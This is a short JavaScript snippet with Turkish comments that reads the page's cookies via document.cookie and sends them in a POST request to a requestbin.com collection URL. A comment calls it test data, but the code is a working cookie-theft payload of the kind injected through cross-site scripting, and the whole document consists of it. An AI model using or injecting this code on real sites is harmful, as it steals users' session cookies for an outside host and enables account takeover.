var cookies = document.cookie;  // ya da istediğin test verisi
var binUrl = "https://requestbin.com/r/abcd1234xyz";

var xhr = new XMLHttpRequest();
xhr.open("POST", binUrl, true);
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");

xhr.onload = function() {
  if (xhr.status >= 200 && xhr.status < 300) {
    console.log("Başarılı:", xhr.responseText);
  } else {
    console.error("Hata:", xhr.status, xhr.statusText);
  }
};

xhr.onerror = function() {
  console.error("İstek sırasında bir hata oluştu.");
};

xhr.send(JSON.stringify({ cookies: cookies }));
